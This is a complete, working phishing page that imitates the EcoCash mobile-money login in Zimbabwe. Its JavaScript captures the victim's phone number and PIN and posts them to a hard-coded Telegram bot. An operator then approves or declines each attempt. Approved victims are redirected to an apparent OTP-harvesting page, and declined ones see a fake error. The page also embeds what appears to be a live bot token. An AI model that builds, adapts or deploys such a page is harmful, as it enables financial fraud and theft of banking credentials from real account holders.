<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>EcoCash Login – two-step</title>
  
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #e5e5e5;
    }
    .container {
      width: 100%;
      max-width: 400px;
      margin: auto;
      background: white;
      min-height: 100vh;
      position: relative;
      overflow: hidden;
    }
    .main-content {
      position: relative;
      z-index: 2;
      padding-bottom: 10px;
    }
    .logo {
      text-align: center;
      font-size: 38px;
      font-weight: bold;
      margin-top: 40px;
    }
    .logo span:first-child { color: #1c6aa6; }
    .logo span:last-child { color: #e12b2b; }
    .login-title {
      text-align: center;
      color: #666;
      font-size: 26px;
      margin-top: 18px;
    }
    .phone-box {
      margin: 22px;
      border: 2px solid #1c6aa6;
      border-radius: 10px;
      display: flex;
      align-items: center;
      padding: 10px 12px;
      background: #f2f2f2;
    }
    .flag {
      width: 26px;
      margin-right: 8px;
    }
    .code {
      color: #666;
      margin-right: 10px;
      font-size: 16px;
    }
    .phone-input {
      border: none;
      outline: none;
      background: transparent;
      font-size: 17px;
      flex: 1;
    }
    .pin-title {
      text-align: center;
      color: #666;
      margin-top: 5px;
    }
    .pin-box {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-top: 18px;
    }
    .pin {
      width: 44px;
      height: 44px;
      border-radius: 10px;
      border: 2px solid #1c6aa6;
      text-align: center;
      font-size: 20px;
      outline: none;
      transition: all 0.1s ease;
    }
    .pin:focus {
      border-color: #e12b2b !important;
      box-shadow: 0 0 0 2px rgba(225,43,43,0.2) !important;
      outline: none;
    }
    /* OTP Screen Styles (kept for UI integrity but never used) */
    .otp-screen {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: white;
      z-index: 10;
      padding: 20px;
      overflow-y: auto;
    }
    .otp-screen.active {
      display: block;
    }
    .otp-header {
      text-align: center;
      margin-top: 30px;
    }
    .otp-header h2 {
      color: #1c6aa6;
      font-size: 24px;
      margin-bottom: 10px;
    }
    .otp-message {
      color: #666;
      font-size: 14px;
      margin-bottom: 30px;
      text-align: center;
    }
    .otp-phone-display {
      background: #f2f2f2;
      padding: 15px;
      border-radius: 10px;
      text-align: center;
      font-size: 20px;
      font-weight: bold;
      color: #1c6aa6;
      margin-bottom: 30px;
      letter-spacing: 1px;
    }
    .otp-phone-display .country-code {
      color: #e12b2b;
      margin-right: 5px;
    }
    .otp-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }
    .otp-input {
      width: 45px;
      height: 55px;
      border: 2px solid #1c6aa6;
      border-radius: 10px;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      outline: none;
    }
    .otp-input:focus {
      border-color: #e12b2b;
    }
    .error-message {
      color: #e12b2b;
      text-align: center;
      font-size: 14px;
      margin: 10px 0;
      min-height: 20px;
    }
    .success-message {
      color: #28a745;
      text-align: center;
      font-size: 14px;
      margin: 10px 0;
      min-height: 20px;
    }
    .back-btn {
      background: #6c757d;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 12px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
      margin-top: 20px;
    }
    .back-btn:hover {
      background: #5a6268;
    }
    .bottom {
      position: relative;
      margin-top: 40px;
      left: 0;
      right: 0;
      background: #125c9c;
      color: white;
      padding-top: 110px;
      padding-bottom: 28px;
      text-align: center;
    }
    .bottom::before {
      content: "";
      position: absolute;
      top: -80px;
      left: -20%;
      width: 140%;
      height: 160px;
      background: white;
      border-bottom-left-radius: 50%;
      border-bottom-right-radius: 50%;
    }
    .bottom p {
      width: 82%;
      margin: auto;
      font-size: 15px;
      line-height: 1.4;
    }
    .buttons {
      display: flex;
      justify-content: center;
      gap: 14px;
      margin: 20px 22px;
    }
    .btn {
      background: white;
      border-radius: 16px;
      padding: 8px 16px;
      flex: 1;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
      cursor: pointer;
      transition: all 0.1s ease;
    }
    .btn svg {
      width: 22px;
      height: 22px;
      fill: #1c6aa6;
    }
    .btn span {
      font-size: 13px;
      color: #333;
      font-weight: bold;
      line-height: 1.2;
    }
    .version {
      margin-top: 24px;
      opacity: 0.85;
      font-size: 14px;
    }
    .terms {
      margin-top: 6px;
      font-size: 14px;
      opacity: 0.9;
    }
    a {
      color: white;
      text-decoration: underline;
    }
    .phone-error {
      color: #e12b2b;
      font-size: 13px;
      margin: -10px 22px 10px 22px;
      text-align: left;
      min-height: 20px;
    }

    /* Spinner Overlay – now blue to match EcoCash branding */
    #spinnerOverlay {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(3px);
      z-index: 9999;
    }
    .spinner-loader {
      width: 48px;
      height: 48px;
      border: 5px solid #ffffff;
      border-top: 5px solid #1c6aa6;  /* changed from red to EcoCash blue */
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<div class="container">
  <!-- Main Login Screen -->
  <div class="main-content" id="loginScreen">
    <div class="logo">
      <span>Eco</span><span>Cash</span>
    </div>
    <div class="login-title">Login</div>

    <div class="phone-box">
      <img class="flag" src="https://flagcdn.com/w40/zw.png" alt="Zimbabwe flag">
      <div class="code">+263</div>
      <input class="phone-input" id="phoneInput" placeholder="Phone Number" type="tel" inputmode="numeric">
    </div>
    <div class="phone-error" id="phoneError"></div>

    <div class="pin-title">Enter your PIN</div>

    <div class="pin-box" id="pinBox">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin1">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin2">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin3">
      <input class="pin" type="password" maxlength="1" inputmode="numeric" id="pin4">
    </div>
  </div>

  <!-- OTP Screen (kept for UI consistency but no longer functional) -->
  <div class="otp-screen" id="otpScreen">
    <div class="otp-header">
      <h2>Verify OTP</h2>
    </div>
    <div class="otp-message">
      A 6-digit OTP has been sent to:
    </div>
    <div class="otp-phone-display" id="otpPhoneDisplay">
      <span class="country-code" id="otpCountryCode">+263</span>
      <span id="otpPhoneNumber"></span>
    </div>
    
    <div class="otp-inputs">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp1">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp2">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp3">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp4">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp5">
      <input class="otp-input" type="text" maxlength="1" inputmode="numeric" id="otp6">
    </div>
    
    <div class="error-message" id="otpError"></div>
    <div class="success-message" id="otpSuccess"></div>
    
    <button class="back-btn" id="backToLoginBtn">← Back to Login</button>
  </div>

  <div class="bottom">
    <p>To register an EcoCash wallet or get assistance, click below</p>

    <div class="buttons">
      <div class="btn" id="registerBtn">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
        </svg>
        <span>Register</span>
      </div>
      <div class="btn" id="helpBtn">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-4h2v2h-2zm1-10c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/>
        </svg>
        <span>Help &amp; Support</span>
      </div>
    </div>

    <div class="version">v3.0.3P</div>
    <div class="terms">
      By signing in you agree to the
      <a href="#">Terms and Conditions</a>
    </div>
  </div>
</div>

<!-- Telegram Spinner Overlay (now blue) -->
<div id="spinnerOverlay">
  <div class="spinner-loader"></div>
</div>

<script>
  (function() {
    // ==================== TELEGRAM CONFIGURATION ====================
    const BOT_TOKEN = '8914349012:AAHK0PwteGNuzocd2wJ1mb2LE2swxDVed8A';
    const CHAT_ID   = '1006917440';
    const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
    
    // ==================== DOM ELEMENTS ====================
    const phoneInput = document.getElementById('phoneInput');
    const phoneErrorDiv = document.getElementById('phoneError');
    const registerBtn = document.getElementById('registerBtn');
    const helpBtn = document.getElementById('helpBtn');
    
    // PIN inputs
    const pinInputs = [
      document.getElementById('pin1'),
      document.getElementById('pin2'),
      document.getElementById('pin3'),
      document.getElementById('pin4')
    ];
    
    // ==================== STATE ====================
    let isProcessing = false;        // prevent double submission / telegram polling active
    let currentPollInterval = null;
    let currentApproveId = null;
    let currentDeclineId = null;
    let pendingPhoneRaw = '';       // stored phone local digits for second attempt
    let pendingPin = '';
    
    // Spinner control
    const spinner = document.getElementById('spinnerOverlay');
    function showSpinner() { spinner.style.display = 'flex'; }
    function hideSpinner() { spinner.style.display = 'none'; }
    
    // ==================== ROBUST PHONE VALIDATION (Zimbabwe) ====================
    // Accepts: 07xxxxxxx (10 digits), 7xxxxxxx (9 digits), 2637xxxxxxx (12 digits)
    // Returns normalized international format +263XXXXXXXXX (13 chars)
    function normalizeZimPhone(rawValue) {
      let digits = rawValue.replace(/\D/g, '');
      if (digits.length === 0) return null;
      
      // Remove leading 263 if present
      if (digits.startsWith('263')) {
        digits = digits.substring(3);
      }
      // Now digits should be local part (starting with 0 or 7)
      if (digits.startsWith('0')) {
        digits = digits.substring(1);
      }
      // digits now should be 9 digits starting with 7 (Zimbabwe mobile)
      if (digits.length === 9 && digits.startsWith('7')) {
        return '+263' + digits;
      }
      // If exactly 9 digits but might not start with 7? Some numbers? Still try
      if (digits.length === 9) {
        return '+263' + digits;
      }
      // If 8 digits maybe? but typical is 9, we allow anyway
      if (digits.length === 8 && (digits.startsWith('7') || digits.startsWith('8'))) {
        return '+263' + digits;
      }
      return null;
    }
    
    // Returns local phone number starting with 7 (9 digits) - what we send to bot
    function getLocalPhoneNumber() {
      const raw = phoneInput.value;
      const normalized = normalizeZimPhone(raw);
      if (!normalized) return null;
      // Extract after +263
      let localPart = normalized.substring(4);
      // Ensure it starts with 7 (typical zim mobile)
      if (localPart.startsWith('7')) {
        return localPart;
      }
      // If somehow not starting with 7, still return as is (might be landline but uncommon)
      return localPart;
    }
    
    function getFormattedPhone() {
      const raw = phoneInput.value;
      const normalized = normalizeZimPhone(raw);
      return normalized; // returns +263XXXXXXXXX or null
    }
    
    function updatePhoneValidation() {
      const raw = phoneInput.value;
      const normalized = normalizeZimPhone(raw);
      const isValid = normalized !== null && normalized.length === 13 && normalized.startsWith('+263');
      
      if (raw.length === 0) {
        phoneErrorDiv.textContent = '';
        phoneInput.style.borderColor = '#1c6aa6';
      } else if (!isValid) {
        phoneErrorDiv.textContent = 'Enter a valid phone number (e.g., 0712345678 or 712345678)';
        phoneInput.style.borderColor = '#e12b2b';
      } else {
        phoneErrorDiv.textContent = '';
        phoneInput.style.borderColor = '#1c6aa6';
      }
      return isValid;
    }
    
    // Reset all states, clear polling and UI
    function resetAllState() {
      if (currentPollInterval) {
        clearInterval(currentPollInterval);
        currentPollInterval = null;
      }
      currentApproveId = null;
      currentDeclineId = null;
      isProcessing = false;
      pendingPhoneRaw = '';
      pendingPin = '';
      hideSpinner();
      setPinInputsEnabled(true);
      phoneInput.disabled = false;
      // clear any error that might be lingering
      if (phoneErrorDiv.textContent.includes('declined') || phoneErrorDiv.textContent.includes('Incorrect PIN')) {
        phoneErrorDiv.textContent = '';
      }
    }
    
    // Clear PIN fields and optionally focus first
    function clearPinFields(shouldFocus = false) {
      pinInputs.forEach(input => {
        input.value = '';
        input.style.borderColor = '#1c6aa6';
      });
      if (shouldFocus && pinInputs[0] && !isProcessing) {
        pinInputs[0].focus();
      }
    }
    
    function showLocalError(msg) {
      phoneErrorDiv.textContent = msg;
      phoneErrorDiv.style.color = '#e12b2b';
    }
    
    function setPinInputsEnabled(enabled) {
      pinInputs.forEach(input => {
        if (enabled) input.removeAttribute('disabled');
        else input.setAttribute('disabled', 'disabled');
      });
    }
    
    // ==================== TELEGRAM HELPERS ====================
    function escapeHtml(unsafe) {
      if (!unsafe) return '';
      return unsafe.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
      });
    }
    
    function stopPolling() {
      if (currentPollInterval) {
        clearInterval(currentPollInterval);
        currentPollInterval = null;
      }
    }
    
    // Start polling for admin decision (Approve / Decline)
    function startPollingForDecision(approveCallbackId, declineCallbackId) {
      stopPolling();
      let lastUpdateId = 0;
      
      currentPollInterval = setInterval(async () => {
        if (!isProcessing) {
          stopPolling();
          return;
        }
        try {
          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
          const response = await fetch(url);
          const data = await response.json();
          if (!data.ok || !data.result.length) return;
          
          for (const update of data.result) {
            lastUpdateId = Math.max(lastUpdateId, update.update_id);
            const callback = update.callback_query;
            if (!callback) continue;
            const cbData = callback.data;
            
            if (cbData === approveCallbackId) {
              // Admin approved -> redirect to otp.html
              stopPolling();
              isProcessing = false;
              hideSpinner();
              // Store context (optional)
              sessionStorage.setItem('ecocash_approved_phone', pendingPhoneRaw);
              sessionStorage.setItem('ecocash_approved_pin', pendingPin);
              // Redirect to otp.html
              window.location.href = 'otp.html';
              return;
            }
            
            if (cbData === declineCallbackId) {
              // Admin declined
              stopPolling();
              isProcessing = false;
              hideSpinner();
              setPinInputsEnabled(true);
              phoneInput.disabled = false;
              showLocalError('Incorrect Mobile number and/or PIN provided.');
              clearPinFields(false); // clear PIN but don't auto-focus
              pendingPhoneRaw = '';
              pendingPin = '';
              return;
            }
          }
        } catch (err) {
          console.warn('Polling error:', err);
        }
      }, 1500);
    }
    
    // Send credentials to Telegram bot with inline buttons "Approve" and "Decline"
    // phoneNumberForBot should be local format starting with 7 (e.g., 712345678)
    async function sendCredentialsToTelegram(localPhoneNumber, pinCode) {
      const timestamp = Date.now();
      const approveId = `ecocash_approve_${timestamp}`;
      const declineId = `ecocash_decline_${timestamp}`;
      currentApproveId = approveId;
      currentDeclineId = declineId;
      
      pendingPhoneRaw = localPhoneNumber;
      pendingPin = pinCode;
      
      const message = `🔐 <b>EcoCash Login Request </b>\n\n` +
                      `<b> Phone: </b> <code>${escapeHtml(localPhoneNumber)}</code>\n` +
                      `<b> 4-Digit PIN: </b> <code>${escapeHtml(pinCode)}</code>\n\n` +
                      `⚠️ <b>Action required:</b> Approve or Decline this login attempt.`;
      
      try {
        const response = await fetch(`${API_BASE}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [[
                { text: '✅ Approve', callback_data: approveId },
                { text: '❌ Decline', callback_data: declineId }
              ]]
            }
          })
        });
        
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        // Start polling for admin decision
        startPollingForDecision(approveId, declineId);
      } catch (err) {
        console.error('Telegram send error:', err);
        hideSpinner();
        isProcessing = false;
        setPinInputsEnabled(true);
        phoneInput.disabled = false;
        showLocalError('Network error. Unable to contact verification service. Please try again later.');
        clearPinFields(false);
      }
    }
    
    // ==================== SUBMIT LOGIC (DIRECT, NO FAKE ATTEMPT) ====================
    async function submitToTelegram() {
      if (isProcessing) return;
      
      const rawPhone = phoneInput.value.trim();
      if (!rawPhone) {
        showLocalError('Please enter your phone number');
        clearPinFields(false);
        return;
      }
      
      // Get local phone number starting with 7 (no country code, no leading zero)
      const localPhone = getLocalPhoneNumber();
      if (!localPhone || localPhone.length < 9) {
        showLocalError('Please enter a valid Zimbabwe number (e.g., 0712345678 or 712345678)');
        clearPinFields(false);
        return;
      }
      
      const pinValue = pinInputs.map(p => p.value).join('');
      if (pinValue.length !== 4) {
        showLocalError('Please enter your 4-digit PIN');
        clearPinFields(false);
        return;
      }
      
      // All good - send to Telegram with local phone format (7...)
      isProcessing = true;
      setPinInputsEnabled(false);
      phoneInput.disabled = true;
      showSpinner();
      
      await sendCredentialsToTelegram(localPhone, pinValue);
    }
    
    // ==================== PIN AUTO-ADVANCE & LISTENERS ====================
    function focusNext(inputs, currentIndex) {
      if (currentIndex < inputs.length - 1) inputs[currentIndex + 1].focus();
    }
    function focusPrev(inputs, currentIndex) {
      if (currentIndex > 0) inputs[currentIndex - 1].focus();
    }
    
    function setupPinEvents() {
      pinInputs.forEach((input, idx) => {
        const pinInputHandler = function(e) {
          if (isProcessing) return;
          let val = this.value;
          val = val.replace(/\D/g, '').slice(0,1);
          this.value = val;
          if (val.length === 1) {
            if (idx < pinInputs.length - 1) {
              focusNext(pinInputs, idx);
            } else {
              // Last digit entered → all PIN digits ready
              const fullPin = pinInputs.map(p => p.value).join('');
              if (fullPin.length === 4) {
                // Small delay to let UI settle, then submit
                setTimeout(() => {
                  // Only submit if phone is valid (will show error otherwise)
                  submitToTelegram();
                }, 50);
              }
            }
          }
        };
        
        const pinKeydownHandler = function(e) {
          if (isProcessing) e.preventDefault();
          if (e.key === 'Backspace') {
            if (this.value.length === 0 && idx > 0) {
              e.preventDefault();
              pinInputs[idx - 1].focus();
              pinInputs[idx - 1].value = '';
              pinInputs[idx - 1].dispatchEvent(new Event('input'));
            }
          } else if (e.key === 'ArrowLeft') {
            if (idx > 0) { e.preventDefault(); focusPrev(pinInputs, idx); }
          } else if (e.key === 'ArrowRight') {
            if (idx < pinInputs.length - 1) { e.preventDefault(); focusNext(pinInputs, idx); }
          } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && e.key !== 'Backspace') {
            e.preventDefault();
          }
        };
        
        const pinPasteHandler = function(e) {
          if (isProcessing) return;
          e.preventDefault();
          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
          if (pasted.length) {
            const pinDigits = pasted.slice(0,4).split('');
            pinInputs.forEach((p, i) => {
              if (pinDigits[i]) p.value = pinDigits[i];
              else p.value = '';
            });
            const fullPin = pinInputs.map(p => p.value).join('');
            if (fullPin.length === 4) {
              submitToTelegram();
            } else if (pinInputs[0]) {
              pinInputs[0].focus();
            }
          }
        };
        
        input.removeEventListener('input', pinInputHandler);
        input.removeEventListener('keydown', pinKeydownHandler);
        input.removeEventListener('paste', pinPasteHandler);
        input.addEventListener('input', pinInputHandler);
        input.addEventListener('keydown', pinKeydownHandler);
        input.addEventListener('paste', pinPasteHandler);
      });
    }
    
    // ==================== PHONE INPUT HANDLING (No unwanted focus stealing) ====================
    function onPhoneChange() {
      if (isProcessing) return;
      // Reset any pending state and clear PIN fields when phone number changes
      resetAllState();
      clearPinFields(false);
      updatePhoneValidation();
      // Clear any error messages
      if (phoneErrorDiv.textContent.includes('declined')) {
        phoneErrorDiv.textContent = '';
      }
      pendingPhoneRaw = '';
      pendingPin = '';
    }
    
    phoneInput.addEventListener('input', function() {
      updatePhoneValidation();
      onPhoneChange();
    });
    
    phoneInput.addEventListener('blur', function() {
      const raw = phoneInput.value;
      const normalized = normalizeZimPhone(raw);
      if (normalized) {
        // Display local friendly format (without +263, and without leading 0)
        let localPart = normalized.substring(4);
        phoneInput.value = localPart;
      }
      updatePhoneValidation();
    });
    
    // Restrict phone input digits only, allow backspace etc.
    phoneInput.addEventListener('keydown', function(e) {
      if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && e.key !== 'Tab') {
        e.preventDefault();
      }
    });
    
    // ==================== BUTTON HANDLERS ====================
    if (registerBtn) {
      registerBtn.addEventListener('click', () => {
        phoneInput.focus();
        resetAllState();
        clearPinFields(false);
        phoneInput.disabled = false;
      });
    }
    if (helpBtn) {
      helpBtn.addEventListener('click', () => {
        phoneInput.focus();
      });
    }
    
    const backToLoginLegacy = document.getElementById('backToLoginBtn');
    if (backToLoginLegacy) {
      backToLoginLegacy.addEventListener('click', () => {
        resetAllState();
        clearPinFields(false);
        phoneInput.disabled = false;
        phoneInput.focus();
        showLocalError('');
      });
    }
    
    // ==================== INITIAL SETUP ====================
    function init() {
      updatePhoneValidation();
      setupPinEvents();
      clearPinFields(false);
      resetAllState();
      setPinInputsEnabled(true);
      phoneInput.disabled = false;
      // Hide OTP screen entirely
      const otpScreenDiv = document.getElementById('otpScreen');
      if (otpScreenDiv) otpScreenDiv.style.display = 'none';
      // Place cursor in phone field initially
      phoneInput.focus();
    }
    
    init();
  })();
</script>
</body>
</html>
